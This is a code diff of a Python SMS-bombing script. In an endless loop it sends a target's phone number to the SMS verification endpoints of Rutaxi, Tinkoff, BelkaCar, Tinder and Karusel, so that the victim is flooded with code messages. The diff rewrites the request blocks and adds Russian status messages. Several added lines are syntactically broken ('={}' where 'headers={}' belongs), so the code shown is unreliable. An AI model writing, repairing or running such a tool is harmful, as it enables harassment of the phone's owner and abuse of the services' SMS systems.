@@ -33,31 +33,37 @@ iteration = 10
 while True:
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
-        try:
-            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-        except:
-            s=s
+        try: 
+            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, ={}) 
+            print("[+] Rutaxi вкинулся!") 
+        except Exception as ex:  
+            print("[-] Rutaxi откинулся!" + str(ex))
+            
         try: 
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}) 
-            print("[+] Tinkoff отправлено!") 
+            print("[+] Tinkoff вкинулся!") 
         except Exception as ex:  
-            print("[-] Tinkoff не отправлено!" + str(ex))
+            print("[-] Tinkoff откинулся!" + str(ex))
 
 
-        try:
-            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-        except:
-            s=s
+        try: 
+            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, ={}) 
+            print("[+] BelkaCar вкинулся!") 
+        except Exception as ex:  
+            print("[-] BelkaCar откинулся!" + str(ex))
 
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-        except:
-            s=s
+        try: 
+            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, ={}) 
+            print("[+] Тиндер вкинулся!") 
+        except Exception as ex:  
+            print("[-] Тиндер откинулся!" + str(ex))
 
-        try:
-            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-        except:
-            s=s
+
+        try: 
+            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, ={}) 
+            print("[+] Карусель вкинулся!") 
+        except Exception as ex:  
+            print("[-] Карусель откинулся!" + str(ex))
 
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
